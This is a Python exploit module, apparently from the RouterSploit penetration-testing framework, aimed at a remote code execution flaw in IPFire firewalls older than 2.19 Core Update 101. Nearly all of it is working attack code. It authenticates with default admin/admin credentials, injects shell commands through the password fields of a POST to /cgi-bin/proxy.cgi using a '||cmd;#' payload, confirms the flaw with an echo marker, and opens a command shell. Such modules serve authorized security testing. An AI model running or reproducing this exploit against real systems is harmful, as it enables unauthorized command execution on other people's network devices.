from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "IPFire Proxy RCE",
        "description": "Module exploits IPFire < 2.19 Core Update 101 Remote Code Execution "
                       "vulnerability which allows executing commands on operating system level.",
        "authors": (
            "Yann CAM",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/39765/",
            "http://www.ipfire.org/news/ipfire-2-19-core-update-101-released",
        ),
        "devices": (
            "IPFire < 2.19 Core Update 101",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(444, "Target HTTP port")
    ssl = OptBool(True, "SSL enabled: true/false")

    username = OptString("admin", "Username to log in with")
    password = OptString("admin", "Password to log in with")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self,
                  architecture="cmd",
                  method="cmd",
                  payloads=["awk"])
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": self.get_target_url(path="/cgi-bin/proxy.cgi"),
        }

        payload = "||{};#".format(cmd)

        data = {
            "NCSA_USERNAME": utils.random_text(12),
            "NCSA_GROUP": "standard",
            "NCSA_PASS": payload,
            "NCSA_PASS_CONFIRM": payload,
            "SUBMIT": "Create+user",
            "ACTION": "Add",
            "NCSA_MIN_PASS_LEN": "6",
        }

        response = self.http_request(
            method="POST",
            path="/cgi-bin/proxy.cgi",
            headers=headers,
            data=data,
            auth=(self.username, self.password),
        )

        if response:
            end = response.text.find("<!DOCTYPE html>")

            if end:
                return response.text[:end]

        return ""

    @mute
    def check(self):
        mark = utils.random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
